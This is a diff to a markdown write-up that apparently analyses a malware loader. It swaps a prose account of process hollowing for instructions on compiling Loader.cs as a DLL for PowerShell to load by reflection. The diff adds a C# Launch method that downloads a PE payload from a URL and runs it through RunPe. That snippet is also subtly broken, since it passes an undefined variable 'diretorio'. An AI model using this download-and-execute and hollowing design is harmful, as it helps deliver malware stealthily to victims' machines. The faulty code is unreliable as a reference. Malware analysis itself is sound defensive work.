@@ -7,34 +7,40 @@ The script.ps1 likely acts as the initiating script, which either:
 Downloads the compiled Loader binary.
 Executes the Loader with the required parameters (e.g., URLs or paths to payloads).
 
-## Technical Details of Loader.cs
+## Technical Details of Loader.cs as a DLL
 
-Key Functions in Loader.cs:
+Compilation to DLL:
 
-    RunPe(byte[] payloadBuffer, string host, string args):
+    The Loader.cs code will be compiled into a .NET DLL (Dynamic Link Library).
+    This allows external applications, including PowerShell, to interact with its public methods using reflection or direct invocation via the .NET framework.
 
-    Core function that handles process hollowing.
-    
-    Uses low-level Windows API calls (e.g., CreateProcess, VirtualAllocEx, WriteProcessMemory) to:
-    
-    Create a new suspended process.
-    
-    Replace the legitimate process image with the payload.
-    
-    Adjust the thread context and resume execution from the payload's entry point.
-    
-    Launch(string appurl, string path):
-    
-    Downloads a PE payload from appurl.
-    
-    Calls RunPe to execute the payload using the specified path.
+Exposed Methods:
 
-Low-Level Process Hollowing Steps:
+    Loader.cs must expose its methods, such as Launch or RunPe, as public static so they can be called from PowerShell.
+    For example:
 
-    A target process is created in a suspended state (CreateProcess).
-    The memory image of the target process is unmapped (ZwUnmapViewOfSection).
-    Memory is allocated in the target process (VirtualAllocEx) for the payload.
-    The payload is written into the target process memory (WriteProcessMemory).
-    The thread context is modified to point to the entry point of the payload (SetThreadContext).
-    The process thread is resumed (ResumeThread), executing the payload.
+```csharp
+
+public static void Launch(string appurl, string path)
+        {
+            if (!File.Exists(path))
+            {
+                return;
+            }
+
+            using (WebClient webClient = new WebClient())
+            {
+                byte[] Bytes = webClient.DownloadData(appurl);
+                RunPe(Bytes, diretorio, "");
+            }
+
+        }
+```
+    
+
+Interaction via PowerShell:
+
+    The PowerShell script will use the [Reflection.Assembly]::LoadFrom() or Add-Type methods to load the DLL and call its methods.
+
+        
 
